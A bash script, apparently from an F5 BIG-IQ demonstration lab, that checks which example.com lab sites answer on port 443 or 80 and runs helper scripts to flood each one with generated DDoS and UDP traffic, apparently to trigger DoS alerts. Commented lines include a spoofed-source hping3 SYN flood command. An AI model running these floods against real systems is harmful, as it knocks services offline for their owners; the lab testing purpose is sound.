#!/bin/bash
# Uncomment set command below for code debuging bash
# set -x

home="/home/f5/scripts"
cmip="10.1.10.4"

already=$(ps -ef | grep "$0" | grep bash | grep -v grep | wc -l)
if [  $already -gt 2 ]; then
    echo "The script is already running `expr $already - 2` time."
    exit 1
fi

# do not add site17, 19 and 21 (used for access app)
sitefqdn[1]="site10.example.com"
sitefqdn[2]="site11.example.com"
sitefqdn[3]="site12.example.com"
sitefqdn[4]="site13.example.com"
sitefqdn[5]="site14.example.com"
sitefqdn[6]="site15.example.com"
sitefqdn[7]="site16.example.com"
sitefqdn[8]="site18.example.com"
sitefqdn[9]="site20.example.com"
sitefqdn[10]="site22.example.com"
sitefqdn[11]="site23.example.com"
sitefqdn[12]="site25.example.com"
sitefqdn[13]="site26.example.com"
sitefqdn[14]="site27.example.com"
sitefqdn[15]="site28.example.com"
sitefqdn[16]="site29.example.com"
sitefqdn[17]="site30.example.com"
sitefqdn[18]="site32.example.com"
sitefqdn[19]="site36.example.com"
sitefqdn[20]="site38.example.com"
sitefqdn[21]="site40.example.com"
sitefqdn[22]="site42.example.com"

# add FQDN from Apps deployed with the SSG Azure and AWS scripts from /home/f5/scripts/ssg-apps
if [ -f /home/f5/scripts/ssg-apps ]; then
        i=${#sitefqdn[@]}
        SSGAPPS=$(cat /home/f5/scripts/ssg-apps)
        for fqdn in ${SSGAPPS[@]}; do
                i=$(($i+1))
                sitefqdn[$i]="$fqdn"
        done
fi


# get length of the array
arraylength=${#sitefqdn[@]}

# customise thresholds for BIG-IQ
#curl -X GET http://localhost:8100/cm/shared/policymgmt/alert-rules/dos-bad-traffic-growth-default-rule
#json='{"name":"dos-bad-traffic-growth-default-rule","alertTypeId":"dos-bad-traffic-growth","isDefault":true,"producerType":"application","alertType":"active","alertContext":"dos-l7-attacks","alertRuleType":"metric","errorThreshold":0,"unit":"count","operator":"greater-than","observation":2,"referenceObservation":4,"errorDelta":0,"enabled":true,"generation":1,"lastUpdateMicros":1544082602332631,"kind":"cm:shared:policymgmt:alert-rules:alertrulestate","selfLink":"https://localhost/mgmt/cm/shared/policymgmt/alert-rules/dos-bad-traffic-growth-default-rule"}'
#curl -X PATCH http://localhost:8100/cm/shared/policymgmt/alert-rules/dos-bad-traffic-growth-default-rule -d $json


for (( i=1; i<${arraylength}+1; i++ ));
do
    if [ ! -z "${sitefqdn[$i]}" ]; then
        # Only generat traffic on alive VIP
        ip=$(ping -c 1 -w 1 ${sitefqdn[$i]} | grep PING | awk '{ print $3 }')
        timeout 1 bash -c "cat < /dev/null > /dev/tcp/${ip:1:-1}/443"
        if [  $? == 0 ]; then
		# Port 443 open
		port=443
        else
                # If 443 not anwser, trying port 80
                timeout 1 bash -c "cat < /dev/null > /dev/tcp/${ip:1:-1}/80"
                if [  $? == 0 ]; then
                        # Port 80 open
                        port=80
                else
                      port=0
                fi
        fi

        if [[  $port == 443 || $port == 80 ]]; then
            
            echo -e "\n# site $i ${sitefqdn[$i]} DDOS attack"

            # sudo docker run -t -i kalilinux/kali-linux-docker apt-get update && apt-get install metasploit-framework
            # sudo docker run -t -i kalilinux/kali-linux-docker hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source site42.example.com &

            # hping3 flood mod
            #sudo hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source ${sitefqdn[$i]} &
            #pid=$(ps -ef | grep hping3 | grep -v grep | awk '{ print $2 }')
            #echo $pid
            #r=`shuf -i 120-600 -n 1`;
            #perl -le "sleep rand $r" && sudo kill -9 $pid &
            #ps -ef | grep hping3 | grep -v grep
            #ps -ef | grep "sleep rand" | grep -v grep

            cd $home/DDosAttacks
            ./gen_data.sh ${sitefqdn[$i]}
            ./gen_udp_floods.sh ${sitefqdn[$i]}
            
            r=`shuf -i 120-600 -n 1`;
            perl -le "sleep rand $r" && ./kill_all_attacks.sh


        else
                echo "SKIP ${sitefqdn[$i]} - $ip not answering on port 443 or 80"
        fi
   fi
done